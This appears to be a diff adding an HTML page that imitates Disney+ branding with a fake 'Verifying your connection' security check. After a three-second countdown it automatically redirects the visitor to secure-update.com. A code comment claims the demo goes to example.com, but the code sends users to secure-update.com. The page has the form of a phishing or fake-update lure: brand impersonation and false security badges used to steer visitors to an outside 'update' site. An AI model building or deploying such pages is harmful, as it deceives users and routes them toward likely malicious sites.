@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connection Verification</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        disney: '#0072D2',
+                        disneyDark: '#0061b0'
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #0072D2, #0061b0);
+            min-height: 100vh;
+        }
+        
+        .loader {
+            width: 48px;
+            height: 48px;
+            border: 5px solid #FFF;
+            border-bottom-color: transparent;
+            border-radius: 50%;
+            display: inline-block;
+            box-sizing: border-box;
+            animation: rotation 1s linear infinite;
+        }
+
+        @keyframes rotation {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .countdown {
+            font-size: 2rem;
+            font-weight: 700;
+        }
+        
+        .demo-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background-color: #0072D2;
+            color: white;
+            text-align: center;
+            padding: 8px;
+            font-weight: bold;
+            z-index: 100;
+        }
+        
+        .disney-logo {
+            position: absolute;
+            left: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        
+        @media (max-width: 768px) {
+            .disney-logo {
+                position: relative;
+                left: auto;
+                top: auto;
+                transform: none;
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="demo-banner">You will be redirected automatically</div>
+    
+    <div class="container mx-auto px-4 flex flex-col items-center justify-center min-h-screen">
+        <!-- Disney+ Logo on the left -->
+        <div class="disney-logo hidden md:block">
+            <svg width="120" height="60" viewBox="0 0 1000 300" xmlns="http://www.w3.org/2000/svg">
+                <path d="M628.2,261.9c-2.8,1.1-9.5,1.7-19.1,1.7c-24.6,0-37.1-10.9-37.1-32.6c0-20.1,13.3-33.4,33.4-33.4 c9.5,0,16.3,1.7,22.9,5.7v-24.6c-6.9-2.3-15.2-3.4-24.6-3.4c-13.8,0-26.3,3.4-36.6,10.3c-16.3,10.9-24.6,28.9-24.6,51.7 c0,19.5,6.3,34.3,19.1,44.3c10.9,8.6,24.9,12.6,47.2,12.6c10.3,0,19.5-1.7,26.3-4.6L628.2,261.9z M500.9,289.1h26.3v-83.7h38.9 v-22.3h-38.9v-31.4h41.7v-22.3h-68V289.1z M371.2,289.1h26.3V129.4h-26.3V289.1z M243.1,289.1h26.3v-83.7h38.9v-22.3h-38.9v-31.4 h41.7v-22.3h-68V289.1z M74.2,289.1h26.3v-59.7h13.8c11.5,0,16.9,5.2,19.5,19.5c3.4,16.9,1.7,31.4,5.2,40.3h26.3 c-5.7-8-5.2-28.9-6.9-42.6c-1.7-16.3-8-28.3-19.5-30.9v-0.6c14.4-6.3,22.3-17.8,22.3-34.3c0-12.1-4.6-22.3-12.6-28.9 c-9.2-7.5-20.1-9.7-37.7-9.7H74.2V289.1z M100.5,151.7h14.4c14.4,0,22.3,5.7,22.3,19.5c0,14.4-8,20.1-22.3,20.1h-14.4V151.7z M925.9,289.1V129.4h-26.3v159.7H925.9z M845.5,220.8c0,26.3-8,47.2-42.6,47.2c-34.3,0-42.6-20.9-42.6-47.2v-91.4h-26.3v93.1 c0,42,19.5,70.3,68.9,70.3c49.2,0,68.9-28.3,68.9-70.3v-93.1h-26.3V220.8z M678.8,289.1h26.3V129.4h-26.3V289.1z" fill="#ffffff"/>
+            </svg>
+        </div>
+        
+        <div class="bg-white rounded-xl shadow-2xl p-8 max-w-md w-full text-center relative overflow-hidden">
+            <div class="absolute top-0 left-0 w-full h-2 bg-disney"></div>
+            
+            <!-- Large Robot Icon above the bar -->
+            <div class="absolute -top-16 left-1/2 transform -translate-x-1/2">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-32 w-32 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 14l9-5-9-5-9 5 9 5z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 14l9-5-9-5-9 5 9 5z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 14l9-5-9-5-9 5 9 5z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M19 11v4a2 2 0 01-2 2H7a2 2 0 01-2-2v-4" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 17v4" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 21h6" />
+                </svg>
+            </div>
+            
+            <!-- Disney+ Logo for mobile -->
+            <div class="block md:hidden mb-6">
+                <svg width="120" height="60" viewBox="0 0 1000 300" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M628.2,261.9c-2.8,1.1-9.5,1.7-19.1,1.7c-24.6,0-37.1-10.9-37.1-32.6c0-20.1,13.3-33.4,33.4-33.4 c9.5,0,16.3,1.7,22.9,5.7v-24.6c-6.9-2.3-15.2-3.4-24.6-3.4c-13.8,0-26.3,3.4-36.6,10.3c-16.3,10.9-24.6,28.9-24.6,51.7 c0,19.5,6.3,34.3,19.1,44.3c10.9,8.6,24.9,12.6,47.2,12.6c10.3,0,19.5-1.7,26.3-4.6L628.2,261.9z M500.9,289.1h26.3v-83.7h38.9 v-22.3h-38.9v-31.4h41.7v-22.3h-68V289.1z M371.2,289.1h26.3V129.4h-26.3V289.1z M243.1,289.1h26.3v-83.7h38.9v-22.3h-38.9v-31.4 h41.7v-22.3h-68V289.1z M74.2,289.1h26.3v-59.7h13.8c11.5,0,16.9,5.2,19.5,19.5c3.4,16.9,1.7,31.4,5.2,40.3h26.3 c-5.7-8-5.2-28.9-6.9-42.6c-1.7-16.3-8-28.3-19.5-30.9v-0.6c14.4-6.3,22.3-17.8,22.3-34.3c0-12.1-4.6-22.3-12.6-28.9 c-9.2-7.5-20.1-9.7-37.7-9.7H74.2V289.1z M100.5,151.7h14.4c14.4,0,22.3,5.7,22.3,19.5c0,14.4-8,20.1-22.3,20.1h-14.4V151.7z M925.9,289.1V129.4h-26.3v159.7H925.9z M845.5,220.8c0,26.3-8,47.2-42.6,47.2c-34.3,0-42.6-20.9-42.6-47.2v-91.4h-26.3v93.1 c0,42,19.5,70.3,68.9,70.3c49.2,0,68.9-28.3,68.9-70.3v-93.1h-26.3V220.8z M678.8,289.1h26.3V129.4h-26.3V289.1z" fill="#0072D2"/>
+                </svg>
+            </div>
+            
+            <div class="mb-6 mt-10">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16 mx-auto text-disney" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+            </div>
+            
+            <h1 class="text-2xl font-bold text-gray-800 mb-2">Verifying your connection</h1>
+            <p class="text-gray-600 mb-6">Please wait while we secure your connection...</p>
+            
+            <div class="flex flex-col items-center justify-center space-y-4 mb-6">
+                <span class="loader"></span>
+                <div class="countdown text-disney" id="countdown">3</div>
+                <div class="w-full bg-gray-200 rounded-full h-2.5">
+                    <div class="bg-disney h-2.5 rounded-full" id="progress-bar" style="width: 100%"></div>
+                </div>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-4 mb-6">
+                <div class="bg-blue-50 rounded-lg p-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mx-auto text-disney mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                    </svg>
+                    <p class="text-sm text-gray-600">Enhanced Security</p>
+                </div>
+                <div class="bg-blue-50 rounded-lg p-3">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-8 w-8 mx-auto text-disney mb-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    </svg>
+                    <p class="text-sm text-gray-600">Private Connection</p>
+                </div>
+            </div>
+            
+            <p class="text-sm text-gray-500">You will be redirected automatically</p>
+            <p class="text-xs text-gray-400 mt-4">Redirecting to: secure-update.com</p>
+            
+            <div class="mt-6 pt-4 border-t border-gray-200">
+                <p class="text-xs text-red-500 font-medium">You will be redirected automatically</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Countdown timer
+        let timeLeft = 3;
+        const countdownEl = document.getElementById('countdown');
+        const progressBar = document.getElementById('progress-bar');
+        
+        const timer = setInterval(() => {
+            timeLeft--;
+            countdownEl.textContent = timeLeft;
+            
+            // Update progress bar
+            const progressWidth = (timeLeft / 3) * 100;
+            progressBar.style.width = progressWidth + '%';
+            
+            if (timeLeft <= 0) {
+                clearInterval(timer);
+                // In a real scenario, this would redirect to secure-update.com
+                // For demo purposes, we'll redirect to example.com
+                window.location.href = "https://secure-update.com/";
+            }
+        }, 1000);
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'961757f606b5e1ed',t:'MTc1Mjg5Nzk1OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
